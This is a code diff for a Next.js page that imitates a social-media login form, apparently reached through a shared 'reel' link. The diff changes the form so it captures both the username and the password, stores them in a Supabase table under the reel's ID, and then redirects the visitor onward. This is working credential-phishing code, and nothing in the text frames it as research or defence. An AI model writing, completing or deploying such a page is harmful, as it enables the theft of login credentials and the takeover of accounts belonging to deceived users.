@@ -6,8 +6,8 @@ import { supabase } from '@/app/lib/supabase';
 
 export default function ReelFormPage() {
   const { reelId } = useParams();
-  const [name, setName] = useState('');
   const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
   
   const [loading, setLoading] = useState(true);
   const [reelData, setReelData] = useState<{ redirectUrl: string, reelId: string } | null>(null);
@@ -47,16 +47,16 @@ export default function ReelFormPage() {
       .insert([
         {
           "reelId": reelData.reelId,
-          name,
           username,
+          password,
         },
       ]);
 
     if (error) {
       console.error('Supabase insert error:', error);
     } else {
-      setName('');
       setUsername('');
+      setPassword('');
       window.location.href = reelData.redirectUrl;
     }
   };
@@ -129,14 +129,14 @@ export default function ReelFormPage() {
                 type="text"
                 placeholder="Phone number, username, or email"
                 value={username}
-                onChange={(e) => setName(e.target.value)}
+                onChange={(e) => setUsername(e.target.value)}
                 className="w-full mb-2 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
-              />
+                />
               <input
                 type="password"
                 placeholder="Password"
                 value={username}
-                onChange={(e) => setUsername(e.target.value)}
+                onChange={(e) => setPassword(e.target.value)}
                 className="w-full mb-3 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
               />
               <button
